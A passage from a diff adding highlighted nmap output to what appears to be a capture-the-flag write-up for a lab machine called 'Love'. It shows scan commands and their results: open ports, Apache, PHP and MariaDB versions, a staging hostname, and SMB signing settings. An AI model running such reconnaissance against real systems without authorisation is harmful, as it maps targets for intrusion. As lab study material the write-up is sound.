+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="n">q</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">SMBProgNeg</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SF</span><span class="p">:</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20t
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:o\x20connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">X11Probe</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20co
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:nnect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">FourOhFourRequest</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0\x01\xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:connect\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LPDString</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:xffj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connec
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:t\x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LDAPSearchReq</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xf
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:fj\x04Host\x20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20to\x20this\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">NCP</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20&#39;10\.10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20thi
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:s\x20MariaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">NotesRPC</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:10\.14\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Ma
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:riaDB\x20server&#34;</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">oracle</span><span class="o">-</span><span class="n">tns</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="s2">&#34;E\0\0\x01\xffj\x04Host\x20&#39;10\.10\.1
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:4\.7&#39;\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20server&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Hosts</span><span class="p">:</span><span class="w"> </span><span class="n">www</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">,</span><span class="w"> </span><span class="n">LOVE</span><span class="p">,</span><span class="w"> </span><span class="n">www</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="p">;</span><span class="w"> </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="p">;</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">results</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span><span class="w"> </span><span class="n">mean</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="n">h44m51s</span><span class="p">,</span><span class="w"> </span><span class="n">deviation</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="n">h02m31s</span><span class="p">,</span><span class="w"> </span><span class="n">median</span><span class="p">:</span><span class="w"> </span><span class="mi">24</span><span class="n">m50s</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">Pro</span><span class="w"> </span><span class="mi">19042</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">Pro</span><span class="w"> </span><span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">OS</span><span class="w"> </span><span class="n">CPE</span><span class="p">:</span><span class="w"> </span><span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows_10</span><span class="p">::</span><span class="o">-</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">Computer</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">Love</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">NetBIOS</span><span class="w"> </span><span class="n">computer</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="n">LOVE</span><span class="err">\</span><span class="n">x00</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">Workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="err">\</span><span class="n">x00</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="k">System</span><span class="w"> </span><span class="n">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">13</span><span class="n">T12</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="o">-</span><span class="mi">07</span><span class="p">:</span><span class="mi">00</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">security</span><span class="o">-</span><span class="k">mode</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">account_used</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="n">blank</span><span class="o">&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">authentication_level</span><span class="p">:</span><span class="w"> </span><span class="k">user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">challenge_response</span><span class="p">:</span><span class="w"> </span><span class="n">supported</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">message_signing</span><span class="p">:</span><span class="w"> </span><span class="n">disabled</span><span class="w"> </span><span class="p">(</span><span class="n">dangerous</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="k">default</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="k">security</span><span class="o">-</span><span class="k">mode</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="mi">2</span><span class="p">.</span><span class="mi">02</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="n">Message</span><span class="w"> </span><span class="n">signing</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">required</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">13</span><span class="n">T19</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">31</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">start_date</span><span class="p">:</span><span class="w"> </span><span class="n">N</span><span class="o">/</span><span class="n">A</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Service</span><span class="w"> </span><span class="n">detection</span><span class="w"> </span><span class="n">performed</span><span class="p">.</span><span class="w"> </span><span class="n">Please</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">any</span><span class="w"> </span><span class="n">incorrect</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span><span class="w"> </span><span class="p">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="n">done</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">55</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="c1">-- 1 IP address (1 host up) scanned in 77.19 seconds
+</span></span></span></code></pre></div><ul>
+<li>All ports scan</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">Nmap</span><span class="w"> </span><span class="mi">7</span><span class="p">.</span><span class="mi">91</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">initiated</span><span class="w"> </span><span class="n">Sat</span><span class="w"> </span><span class="n">Aug</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">04</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">24</span><span class="w"> </span><span class="mi">2021</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">239</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">27</span><span class="n">s</span><span class="w"> </span><span class="n">latency</span><span class="p">).</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Not</span><span class="w"> </span><span class="n">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">65516</span><span class="w"> </span><span class="n">closed</span><span class="w"> </span><span class="n">ports</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">PORT</span><span class="w">      </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w">      </span><span class="k">VERSION</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w">    </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">((</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">flags</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="o">/</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="n">PHPSESSID</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">      </span><span class="n">httponly</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="k">set</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="n">Voting</span><span class="w"> </span><span class="k">System</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">PHP</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">msrpc</span><span class="w">        </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">RPC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">  </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">443</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">http</span><span class="w">     </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="w"> </span><span class="n">Forbidden</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span><span class="w"> </span><span class="n">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">commonName</span><span class="o">=</span><span class="n">staging</span><span class="p">.</span><span class="n">love</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="n">ValentineCorp</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="n">m</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="k">in</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2021</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">18</span><span class="n">T14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">16</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_Not</span><span class="w"> </span><span class="k">valid</span><span class="w"> </span><span class="k">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2022</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">18</span><span class="n">T14</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">16</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="nb">date</span><span class="p">:</span><span class="w"> </span><span class="n">TLS</span><span class="w"> </span><span class="n">randomness</span><span class="w"> </span><span class="n">does</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">represent</span><span class="w"> </span><span class="n">time</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">tls</span><span class="o">-</span><span class="n">alpn</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="n">http</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="w">   </span><span class="k">open</span><span class="w">  </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">Pro</span><span class="w"> </span><span class="mi">19042</span><span class="w"> </span><span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span><span class="w"> </span><span class="p">(</span><span class="n">workgroup</span><span class="p">:</span><span class="w"> </span><span class="n">WORKGROUP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">3306</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">mysql</span><span class="o">?</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">   </span><span class="n">DNSStatusRequestTCP</span><span class="p">,</span><span class="w"> </span><span class="n">DNSVersionBindReqTCP</span><span class="p">,</span><span class="w"> </span><span class="n">HTTPOptions</span><span class="p">,</span><span class="w"> </span><span class="n">Help</span><span class="p">,</span><span class="w"> </span><span class="n">Kerberos</span><span class="p">,</span><span class="w"> </span><span class="n">LANDesk</span><span class="o">-</span><span class="n">RC</span><span class="p">,</span><span class="w"> </span><span class="n">LDAPBindReq</span><span class="p">,</span><span class="w"> </span><span class="n">LPDString</span><span class="p">,</span><span class="w"> </span><span class="n">RTSPRequest</span><span class="p">,</span><span class="w"> </span><span class="n">SIPOptions</span><span class="p">,</span><span class="w"> </span><span class="n">SMBProgNeg</span><span class="p">,</span><span class="w"> </span><span class="n">SSLSessionReq</span><span class="p">,</span><span class="w"> </span><span class="n">TLSSessionReq</span><span class="p">,</span><span class="w"> </span><span class="n">TerminalServerCookie</span><span class="p">,</span><span class="w"> </span><span class="n">X11Probe</span><span class="p">:</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_</span><span class="w">    </span><span class="k">Host</span><span class="w"> </span><span class="s1">&#39;10.10.14.7&#39;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">allowed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">connect</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">MariaDB</span><span class="w"> </span><span class="n">server</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Apache</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">46</span><span class="w"> </span><span class="p">(</span><span class="n">Win64</span><span class="p">)</span><span class="w"> </span><span class="n">OpenSSL</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="n">j</span><span class="w"> </span><span class="n">PHP</span><span class="o">/</span><span class="mi">7</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">27</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="w"> </span><span class="n">Forbidden</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5040</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="k">unknown</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">         </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span><span class="w"> </span><span class="k">Not</span><span class="w"> </span><span class="k">Found</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="mi">5986</span><span class="o">/</span><span class="n">tcp</span><span class="w">  </span><span class="k">open</span><span class="w">  </span><span class="n">ssl</span><span class="o">/</span><span class="n">http</span><span class="w">     </span><span class="n">Microsoft</span><span class="w"> </span><span class="n">HTTPAPI</span><span class="w"> </span><span class="n">httpd</span><span class="w"> </span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span><span class="w"> </span><span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="w">
